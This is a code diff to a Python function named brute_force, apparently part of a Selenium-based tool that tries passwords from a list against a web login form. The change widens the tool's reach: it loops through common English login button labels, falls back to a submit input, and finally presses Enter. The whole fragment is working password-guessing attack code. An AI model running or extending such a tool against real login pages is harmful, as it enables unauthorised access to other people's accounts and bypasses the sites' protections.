@@ -52,9 +52,32 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                     username_field.send_keys(uname)
                 password_field.clear()
                 password_field.send_keys(pwd)
+                # Try to click common submit/login buttons
                 try:
-                    submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'提交')]")
-                    submit_btn.click()
+                    # Only use common English submit/login button texts
+                    button_texts = [
+                        'submit', 'login', 'sign in', 'sign on', 'signon', 'signin', 'ok', 'go', 'continue', 'next', 'proceed', 'enter', 'confirm'
+                    ]
+                    button_clicked = False
+                    for text in button_texts:
+                        try:
+                            submit_btn = driver.find_element(By.XPATH, f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{text.lower()}')]")
+                            submit_btn.click()
+                            button_clicked = True
+                            break
+                        except Exception:
+                            continue
+                    if not button_clicked:
+                        # Try input[type=submit]
+                        try:
+                            submit_input = driver.find_element(By.XPATH, "//input[@type='submit']")
+                            submit_input.click()
+                            button_clicked = True
+                        except Exception:
+                            pass
+                    if not button_clicked:
+                        # Fallback: send Enter key
+                        password_field.send_keys(Keys.RETURN)
                 except Exception:
                     password_field.send_keys(Keys.RETURN)
                 time.sleep(delay)
